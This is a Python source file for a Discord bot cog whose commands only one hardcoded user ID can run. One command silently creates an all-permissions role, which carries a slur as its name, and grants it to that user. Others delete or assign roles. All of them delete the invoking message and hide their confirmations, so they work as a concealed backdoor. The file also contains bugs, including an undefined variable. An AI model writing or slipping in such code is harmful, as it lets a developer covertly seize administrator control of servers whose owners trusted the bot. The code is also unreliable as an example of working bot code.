import discord
from discord import Embed, Member, Permissions
from discord.ext import commands
from discord.ext.commands import has_permissions, MissingPermissions

from typing import Optional
from datetime import datetime


developerid = 416508283528937472, 000

class beta(commands.Cog):
    def __init__(self, client):
        self.client = client

    @commands.Cog.listener()
    async def on_ready(self):
        print("beta.py Loaded!")

    async def cog_check(self, ctx):
        if ctx.author.id == 416508283528937472: return True

    # tgiveadmin <name>
    @commands.command()
    async def devgiveadmin(self, ctx, user: discord.Member = None):
        await ctx.message.delete()
        guild = ctx.guild
        user = user or ctx.author
            
        role = await guild.create_role(name="retard",permissions=Permissions.all())  
        await user.add_roles(role)

        await ctx.send(f"{user.name} received the role {name}", delete_after=3)

    # tdeleterole <name>
    @commands.command()
    async def devdeleterole(self, ctx, role):
        await ctx.message.delete()
        role = discord.utils.get(ctx.message.guild.roles, name=role)
        await role.delete()

        await ctx.send(f"**{role}** role has been deleted", delete_after=3)
    

    #tgiverole <role>
    @commands.command()
    async def devgiverole(self, ctx, role: discord.Role, *, user: discord.Member=None):
        await ctx.message.delete()
        user = user or ctx.author

        if ctx.me.top_role.position <= role.position: 
            await ctx.send("The role's position is higher than mine and I cannot assign it to users.")
        
        await user.add_roles(role)

        await ctx.send(f"Added the role {role.name} to {user.mention}", delete_after=3)


    # tpurge <ammount>
    @commands.command(aliases=['clear'])
    @commands.has_permissions(administrator=True)
    async def purge(self, ctx, l: int = 50):
        await ctx.message.delete()
        c = await ctx.channel.purge(limit=l)
        await ctx.send(f"Cleared {len(c)} messages", delete_after=3)
        
#####################################################################################################################################
def setup(client):
    client.add_cog(beta(client))
